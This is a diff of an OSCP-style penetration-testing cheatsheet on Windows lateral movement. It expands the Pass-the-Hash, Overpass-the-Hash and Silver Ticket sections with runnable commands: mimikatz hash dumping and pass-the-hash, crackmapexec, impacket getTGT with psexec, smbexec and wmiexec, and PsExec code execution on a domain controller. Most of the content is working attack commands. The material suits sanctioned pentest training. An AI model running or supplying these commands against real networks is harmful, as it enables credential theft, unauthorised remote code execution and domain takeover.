@@ -250,7 +250,7 @@ cmd> winrs -u:[username] -p:[password] -r:http://[target]:5985/wsman "cmd" # exe
 # See https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-main.md#user-account-control-uac-bypass
 ```
 
-Pass-the-Hash (NTLM-based lateral movement)
+Pass-the-Hash
 * Requires user/service account to have local admin rights on target, as connection is made using the `Admin$` share.
 * Requires SMB connection through the firewall
 * Requires Windows File and Print Sharing feature to be enabled.
@@ -276,26 +276,50 @@ $ crackmapexec smb [target] -u [username] -H [hash] -x 'reg add HKLM\System\Curr
 $ crackmapexec smb [target] -u [username] -H [hash] -x "whoami" 
 ```
 
-Overpass-the-Hash (NTLM-based lateral movement)
+Overpass-the-Hash
+* Attack path: obtain a user's NTLM hash -> request Kerberos TGT -> access any machine where the user has permissions.
 * Requirement: user/service account to have local admin on target machine.
+* Useful when Kerberos is the only authentication mechanism allowed in a target.
 * "over" abuse a NTLM hash to gain a full Kerberos TGT or Service Ticket.
 * `psexec.exe` requires local admin rights as it accesses admin$ share.
 ```powershell
+### WITH MIMIKATZ ON COMPROMISED HOST
 mimikatz > sekurlsa::logonpasswords    # obtain NTLM hash
-mimikatz > sekurlsa::pth               # turn hash into Kerberos ticket
+mimikatz > sekurlsa::pth               # create new PS process in context of target user
         /user:[user_name] 
         /domain:[domain_name]
         /ntlm:[hash_value]
         /run:PowerShell.exe
+
+# (new PS window, but on same host)
+PS> klist # should show no TGT/TGS
 PS> net use \\dc01                     # generate TGT by authN to network share on the DC
-PS> klist                              # view TGT/TGS tickets
-PS> .\PsExec.exe \\dc01 cmd.exe        # code exec on the DC
+PS> klist # now should show TGT/TGS
+PS> .\PsExec.exe \\[computer] cmd.exe  # use TGT to perform code exec against
+                                       # target which user has permissions on.
+                                       # (as Psexec does not accept hashes)
+
+### WITH IMPACKET ON KALI
+# Request the TGT with hash
+$ python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
+# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
+$ python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
+# Request the TGT with password
+$ python getTGT.py <domain_name>/<user_name>:[password]
+# If not provided, password is asked
+
+# Set the TGT for impacket use
+$ export KRB5CCNAME=<TGT_ccache_file>
+
+# Execute remote commands with any of the following by using the TGT
+$ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+$ python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+$ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 
-Pass-the-Ticket / Silver Ticket (Kerberos-based lateral movement)
-* Use this technique if service account is NOT a local admin on any servers.
-* Takes advantage of the TGS, by forging our own Service Ticket to access the service account such as MSSQLSvc with any permissions.
-* Does NOT require local admin privileges on target machine (unlike PtH and OPtH) if Service Tickets belong to current user.
+Pass-the-Ticket / Silver Ticket
+* In this attack, user/group permissions in a Service Ticket are blindly trusted by the application on a target server running in the context of the service account. We forge our own Service Ticket (Silver Ticket) to access the resource (e.g. IIS app, MSSQL app) with any permissions we want. If the SPN/service account is used across multiple servers, we can leverage our Silver Ticket against all.
+* By
 * Walkthrough of PTT via. compromised MSSQLSvc hash: https://stealthbits.com/blog/impersonating-service-accounts-with-silver-tickets/
 ```
 # obtain SID of domain (remove RID -XXXX) at the end of the user SID string.
